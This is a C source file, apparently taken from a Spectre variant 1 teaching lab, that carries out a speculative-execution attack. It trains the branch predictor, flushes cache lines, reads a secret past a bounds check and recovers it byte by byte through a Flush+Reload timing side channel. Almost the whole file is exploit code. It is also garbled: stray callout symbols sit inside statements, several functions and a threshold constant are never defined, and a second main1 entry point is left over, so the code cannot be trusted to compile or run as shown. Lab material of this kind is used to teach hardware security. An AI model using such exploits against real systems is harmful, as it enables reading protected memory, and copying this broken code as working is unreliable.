#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

#define DELTA 1024
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t temp = 0;
char *secret = "Some Secret Value"; ➀
uint8_t array[256*4096];
static int scores[256];

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
if (x < buffer_size) {
return buffer[x];
} else {
return 0;
}
}
void spectreAttack1(size_t larger_x)
{
int i;
uint8_t s;
// Train the CPU to take the true branch inside restrictedAccess().
for (i = 0; i < 10; i++) { restrictedAccess(i); }
// Flush buffer_size and array[] from the cache.
_mm_clflush(&buffer_size);
for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
// Ask restrictedAccess() to return the secret in out-of-order execution.
s = restrictedAccess(larger_x); `
array[s*4096 + DELTA] += 88; ´
}


void reloadSideChannelImproved()
{
int i;
volatile uint8_t *addr;
register uint64_t time1, time2;
int junk = 0;
for (i = 0; i < 256; i++) {
addr = &array[i * 4096 + DELTA];
time1 = __rdtscp(&junk);
junk = *addr;
time2 = __rdtscp(&junk) - time1;
if (time2 <= CACHE_HIT_THRESHOLD)
scores[i]++; /* if cache hit, add 1 for this value */
}
}
void spectreAttack(size_t larger_x)
{
int i;
uint8_t s;

for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
// Train the CPU to take the true branch inside victim().
for (i = 0; i < 10; i++) {
_mm_clflush(&buffer_size);
restrictedAccess(i);
}
// Flush buffer_size and array[] from the cache.
_mm_clflush(&buffer_size);
for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
// Ask victim() to return the secret in out-of-order execution.
s = restrictedAccess(larger_x);
array[s*4096 + DELTA] += 88;
}

int main()
{
int i;
uint8_t s;
size_t larger_x = (size_t)(secret-(char*)buffer);
flushSideChannel();
for (i = 0; i < 256; i++) scores[i] = 0;
for (i = 0; i < 1000; i++) {
spectreAttack(larger_x);
reloadSideChannelImproved();
}
int max = 0;
for (i = 0; i < 256; i++){
if(scores[max] < scores[i]) max = i;
}
printf("Reading secret value at %p = ", (void*)larger_x);
printf("The secret value is %d\n", max);
printf("The number of hits is %d\n", scores[max]);
return (0);
}


int main1()
{
	flushSideChannel();
	size_t larger_x = (size_t)(secret - (char*)buffer); ˆ
	spectreAttack(larger_x);
	reloadSideChannel();
	return (0);
}